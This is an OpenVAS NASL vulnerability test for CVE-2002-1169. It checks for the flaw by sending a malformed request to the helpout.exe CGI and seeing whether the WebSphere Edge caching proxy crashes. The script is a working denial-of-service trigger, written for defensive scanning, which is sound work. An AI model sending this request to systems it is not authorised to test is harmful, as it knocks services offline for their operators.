# OpenVAS Vulnerability Test
# $Id: websphere_cache_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: WebSphere Edge caching proxy denial of service
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "We could crash the WebSphere Edge caching proxy by sending a 
bad request to the helpout.exe CGI";

tag_solution = "Upgrade your web server or remove this CGI.";

# References:
# From:"Rapid 7 Security Advisories" <advisory@rapid7.com>
# Message-ID: <OF0A5563E4.CA3D8582-ON85256C5B.0068EEBC-88256C5B.0068BF86@hq.rapid7.com>
# Date: Wed, 23 Oct 2002 12:08:39 -0700
# Subject: R7-0007: IBM WebSphere Edge Server Caching Proxy Denial of Service

if(description)
{
 script_id(11162);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(6002);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 script_cve_id("CVE-2002-1169");
  
 name = "WebSphere Edge caching proxy denial of service";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "crashes the remote proxy";
 script_summary(summary);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("find_service.nasl", "httpver.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (! get_port_state(port) || http_is_dead(port: port)) exit(0);

foreach dir (cgi_dirs())
{
 p = string(dir, "/helpout.exe");
 soc = http_open_socket(port);
 if (! soc) exit(0);	# Bug?

 req = string("GET ", p, " HTTP\r\n\r\n");
 send(socket:soc, data:req);
 http_close_socket(soc);
 if(http_is_dead(port: port))
 {
  security_warning(port);
  exit(0);
 }
}
